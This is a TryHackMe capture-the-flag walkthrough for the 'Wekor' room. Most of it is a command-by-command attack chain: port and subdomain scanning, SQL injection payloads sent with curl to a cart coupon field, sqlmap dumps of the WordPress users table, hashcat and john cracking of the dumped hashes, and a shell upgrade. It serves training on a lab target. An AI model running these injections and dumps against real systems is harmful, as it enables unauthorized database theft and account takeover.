## TryHackMe Walkthrough - Wekor
Added wekor.thm to /etc/hosts

URL=wekor.thm
### How to scan ports with nmap
```bash
IP_ADDR=
nmap -sV -sC -oA initial $IP_ADDR
```
### How to enumerate web server domains
```bash
DNSLISTS=/usr/share/amass/wordlists/subdomains-top1mil-5000.txt
wfuzz -c -w $DNSLISTS -t30 --hw 3 -H "Host:FUZZ.${URL}" "http://${URL}"
```
### How to enumerate web server path/folder/directory
```bash
WORDLISTS=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -e -u http://site.${URL} -xphp,txt -t30 -w ${WORDLISTS}
```
### How to enumerate with wpscan
```bash
wpscan.api=$(cat ~/Downloads/wpscan.api)
wpscan --url http://site.${URL}/wordpress/ -e ap,u --api-token ${wpscan.api}
```
### How to bruteforce sql with sqlmap
Test if vulnerable to sqli
```bash
' or 1 = 1 -- -
```
Pull 
```bash
' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -
```
```bash
curl -X POST http://${URL}/it-next/it_cart.php \
  -d "coupon_code=' OR 1=1 -- -" \
  -d "apply_coupon=Apply Coupon" | grep -i code

curl -X POST http://${URL}/it-next/it_cart.php \
  -d "coupon_code=' UNION SELECT 1, 2, GROUP_CONCAT(table_name) FROM information_schema.tables -- -" \ -d "apply_coupon=Apply Coupon" | grep -i code
```
Capture payload with burpsuite
```bash
POST /it-next/it_cart.php HTTP/1.1

Host: wekor.thm

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 43

Origin: http://wekor.thm

Connection: keep-alive

Referer: http://wekor.thm/it-next/it_cart.php

Upgrade-Insecure-Requests: 1

Priority: u=0, i



coupon_code=12345&apply_coupon=Apply+Coupon
```
Use SQLMAP with payload
```bash
sqlmap -r coupon.req --level 5 --risk=3
```
Use SQLMAP to determine if the database can be pull
```bash
sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --dump
```
Use SQLMAP to explore databases and tables
```bash
sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" --schema
```
Use SQLMAP to pull specific database and table
```bash
sqlmap -u http://${URL}/it-next/it_cart.php --forms "coupon_code=%27+or+1+%3D+1+Limit+0%2C+1+--+-&apply_coupon=Apply+Coupon" -D wordpress -T wp_users --dump
```
### How to crack the hash with hashcat
This is after you pull the users from the wordpress database and extract the hash password into a text file
```bash
hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
### How to persist
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
## Resource
https://erichogue.ca/2021/06/Wekor

https://github.com/kartikeyj96/Tryhackme-Writeups/blob/main/Wekor%20Writeup

https://medium.com/@alonpr1000/wekor-tryhackme-ctf-7741dea91a71
```
